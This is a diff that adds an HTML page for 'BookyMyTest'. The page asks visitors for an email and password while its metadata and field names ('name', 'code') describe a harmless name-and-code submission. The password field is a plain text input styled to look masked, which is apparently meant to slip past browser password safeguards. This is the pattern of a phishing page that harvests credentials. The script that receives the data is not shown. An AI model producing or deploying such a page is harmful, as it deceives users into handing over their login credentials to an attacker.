@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Submit your name and code securely to BookyMyTest." />
+    <meta name="theme-color" content="#0787a3" />
+    <title>BookyMyTest | Submit your details</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Ccircle cx='32' cy='32' r='30' fill='%230787a3'/%3E%3Ctext x='32' y='40' text-anchor='middle' font-family='Arial,sans-serif' font-size='27' font-weight='700' fill='white'%3Eid%3C/text%3E%3C/svg%3E" />
+    <link rel="stylesheet" href="style.css" />
+    <script src="script.js" defer></script>
+  </head>
+  <body>
+    <main class="page-shell">
+      <section class="form-card" aria-labelledby="page-title">
+        <header class="brand-lockup">
+          <h1 id="page-title">BookyMyTest</h1>
+          <span class="brand-badge" aria-label="BookyMyTest ID badge">id</span>
+        </header>
+
+        <p class="intro">Share your details with us to continue.</p>
+
+        <form id="details-form" novalidate>
+          <div class="field-group">
+            <label for="name">Email</label>
+            <input id="name" name="name" type="text" autocomplete="name" maxlength="100" placeholder="Email" required />
+            <p class="field-error" id="name-error" aria-live="polite"></p>
+          </div>
+
+          <div class="field-group">
+            <label for="code">Password</label>
+            <input id="code" class="masked-text" name="code" type="text" autocomplete="one-time-code" maxlength="500" placeholder="Please enter your Password" required />
+            <p class="field-error" id="code-error" aria-live="polite"></p>
+          </div>
+
+          <div class="honeypot" aria-hidden="true">
+            <label for="website">Website</label>
+            <input id="website" name="website" type="text" tabindex="-1" autocomplete="off" />
+          </div>
+
+          <button id="submit-button" type="submit">
+            <span id="button-label">Connect to BookyMyTest</span>
+            <span class="button-badge" aria-hidden="true">id</span>
+          </button>
+
+          <p id="form-message" class="form-message" role="status" aria-live="polite"></p>
+        </form>
+      </section>
+    </main>
+  </body>
+</html>
